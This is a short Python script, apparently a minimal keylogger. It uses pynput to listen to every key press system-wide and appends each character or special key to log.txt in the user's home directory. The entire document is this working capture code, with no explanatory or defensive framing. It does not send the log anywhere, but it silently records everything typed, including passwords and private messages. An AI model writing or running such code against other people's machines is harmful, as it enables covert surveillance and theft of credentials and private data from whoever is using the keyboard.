from pynput import keyboard
import os

path = os.path.join(os.path.expanduser("~"), "log.txt")

def keyPressed(key):
    try:
        with open(path, "a", encoding="utf-8") as file:
            file.write(f"{key.char}\n")
    except AttributeError:
        with open(path, "a", encoding="utf-8") as file:
            file.write(f"\n{key}\n")

def keyReleased(key):
    pass

with keyboard.Listener(on_press=keyPressed, on_release=keyReleased) as listener:
    listener.join()